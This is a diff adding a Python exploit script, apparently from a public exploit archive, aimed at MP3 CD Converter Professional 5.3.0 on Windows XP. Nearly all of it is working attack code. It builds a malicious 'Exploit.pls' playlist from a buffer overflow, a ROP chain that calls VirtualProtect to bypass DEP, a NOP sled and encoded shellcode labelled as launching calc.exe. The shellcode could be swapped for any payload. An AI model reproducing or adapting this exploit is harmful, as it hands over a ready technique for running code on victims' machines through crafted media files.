@@ -1,0 +1,81 @@
+#!/usr/bin/python
+#
+#[+]Exploit Title: MP3 CD Converter Professional Universal DEP Bypass Exploit
+#[+]Date: 11\08\2011
+#[+]Author: C4SS!0 G0M3S
+#[+]Software Link: http://www.mp3-cd-converter.com/mp3cdconverter.exe
+#[+]Version: 5.3.0
+#[+]Tested On: WIN-XP SP3 Brazilian Portuguese
+#[+]CVE: N/A
+#
+
+from struct import pack
+from time import sleep
+from sys import exit
+print '''
+
+		Created By C4SS!0 G0M3S
+		E-mail louredo_@hotmail.com
+		Blog net-fuzzer.blogspot.com
+'''
+sleep(2)
+
+shellcode = ("\xba\xcb\x38\xf3\xb9\xd9\xc7\xd9\x74\x24\xf4\x5f\x2b\xc9" 
+"\xb1\x32\x83\xef\xfc\x31\x57\x0e\x03\x9c\x36\x11\x4c\xde" 
+"\xaf\x5c\xaf\x1e\x30\x3f\x39\xfb\x01\x6d\x5d\x88\x30\xa1" 
+"\x15\xdc\xb8\x4a\x7b\xf4\x4b\x3e\x54\xfb\xfc\xf5\x82\x32" 
+"\xfc\x3b\x0b\x98\x3e\x5d\xf7\xe2\x12\xbd\xc6\x2d\x67\xbc" 
+"\x0f\x53\x88\xec\xd8\x18\x3b\x01\x6c\x5c\x80\x20\xa2\xeb" 
+"\xb8\x5a\xc7\x2b\x4c\xd1\xc6\x7b\xfd\x6e\x80\x63\x75\x28" # Shellcode WinExec "Calc.exe"
+"\x31\x92\x5a\x2a\x0d\xdd\xd7\x99\xe5\xdc\x31\xd0\x06\xef" # BadChars "\x00\x3d"
+"\x7d\xbf\x38\xc0\x73\xc1\x7d\xe6\x6b\xb4\x75\x15\x11\xcf" 
+"\x4d\x64\xcd\x5a\x50\xce\x86\xfd\xb0\xef\x4b\x9b\x33\xe3" 
+"\x20\xef\x1c\xe7\xb7\x3c\x17\x13\x33\xc3\xf8\x92\x07\xe0" 
+"\xdc\xff\xdc\x89\x45\xa5\xb3\xb6\x96\x01\x6b\x13\xdc\xa3" 
+"\x78\x25\xbf\xa9\x7f\xa7\xc5\x94\x80\xb7\xc5\xb6\xe8\x86" 
+"\x4e\x59\x6e\x17\x85\x1e\x80\x5d\x84\x36\x09\x38\x5c\x0b" 
+"\x54\xbb\x8a\x4f\x61\x38\x3f\x2f\x96\x20\x4a\x2a\xd2\xe6" 
+"\xa6\x46\x4b\x83\xc8\xf5\x6c\x86\xaa\x98\xfe\x4a\x2d")
+################################ROP START HERE############################################
+rop = pack('<L',0x00425C69) * 4 # RETN
+rop += pack('<L',0x0045125a) # PUSH ESP # POP ESI # RETN 04 
+rop += pack('<L',0x00425C69) * 2 # RETN
+rop += pack('<L',0x0046194c) # XCHG EAX,ESI # RETN 
+rop += pack('<L',0x0040d8b1) # XCHG EAX,ECX # CLD # ADD AL,0 # POP EDI # POP ESI # POP EBP # POP EBX # ADD ESP,8 # RETN 04 
+rop += "A" * 24 # JUNK
+rop += pack('<L',0x00425C69) * 2 # RETN
+rop += pack('<L',0x10008d68) # POP EDI # RETN
+rop += pack('<L',0x00425C69) # RETN
+rop += pack('<L',0x1000176a) # POP EBP # RETN 
+rop += pack('<L',0x004319e6) # PUSH ESP # RETN // Endereco de retorno da funcao VirtualProtect
+rop += pack('<L',0x0043017a) # POP EBX # RET
+rop += pack('<L',0x00000500) # Valor de dwSize
+rop += pack('<L',0x004078f6) # POP EDX # ADD EAX,4C48300 # POP ESI # RETN 
+rop += pack('<L',0x00000040) # Valor de flNewProtect
+rop += "BBBB" # JUNK
+rop += pack('<L',0x0040dc8c) # POP ESI # RETN 
+rop += pack('<L',0x01E5225F) # JMP DWORD PTR DS:[EAX] // Jmp to eax, EAX == VirtualProtect 
+rop += pack('<L',0x00444ad3) # POP EAX # RETN
+rop += pack('<L',0x007EC070) # Ponteiro para VirtualProtect
+rop += pack('<L',0x1000734d) # PUSHAD # RETN
+################################ROP END HERE###############################################
+buf = ("A" * 16)
+buf += pack('<L',0x00456333) # ADD ESP,318 # RETN 4
+buf += ("B" * (784-len(buf)))
+buf += pack('<L',0x004462D0) # ADD ESP,51C # RETN
+buf += ("A" * 24)
+buf += rop
+buf += "\x90" * 10 
+buf += shellcode
+buf += "C" * 50000
+print "\t\t[+]Creating Exploit File..."
+sleep(1)
+try:
+	f = open("Exploit.pls","wb")
+	f.write(buf)
+	f.close()
+	print "\t\t[+]File \"Exploit.pls\" Created Succefully."
+	sleep(1)
+except  IOError,e:
+	print "\t\t[+]Error: "+str(e)
+	exit(-1)
